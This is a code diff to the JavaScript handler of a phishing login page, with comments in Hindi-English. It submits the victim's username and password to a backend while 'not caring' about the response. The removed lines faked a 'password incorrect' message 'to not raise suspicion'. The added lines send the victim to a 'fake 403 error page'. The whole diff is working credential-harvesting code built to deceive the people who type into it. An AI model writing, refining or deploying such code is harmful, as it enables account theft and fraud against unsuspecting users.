@@ -1,3 +1,6 @@
+// Backend API base URL – tera Render URL (ya relative bhi chalega)
+const API_BASE_URL = ''; // empty means same domain
+
 document.getElementById('loginForm').addEventListener('submit', async (e) => {
   e.preventDefault();
 
@@ -14,29 +17,17 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   const payload = { username, password };
 
   try {
-    const res = await fetch('/api/login', {
+    // Send credentials to backend (we don't care about response)
+    await fetch(`${API_BASE_URL}/api/login`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
 
-    const data = await res.json();
-
-    // Always show a generic error to not raise suspicion
-    responseDiv.style.display = 'block';
-    if (res.ok) {
-      // But we want to make it look like login failed (to avoid raising alarm)
-      responseDiv.innerHTML = '⚠️ Sorry, your password was incorrect. Please try again.';
-      responseDiv.style.color = '#ed4956';
-    } else {
-      responseDiv.innerHTML = '⚠️ Sorry, your password was incorrect. Please try again.';
-      responseDiv.style.color = '#ed4956';
-    }
-    // Clear fields after submission (optional)
-    // document.getElementById('password').value = '';
+    // Immediately redirect to fake 403 error page
+    window.location.href = '/error.html';
   } catch (err) {
-    responseDiv.style.display = 'block';
-    responseDiv.innerHTML = '⚠️ Something went wrong. Please try again.';
-    responseDiv.style.color = '#ed4956';
+    // Even if network error, still go to error page
+    window.location.href = '/error.html';
   }
 });
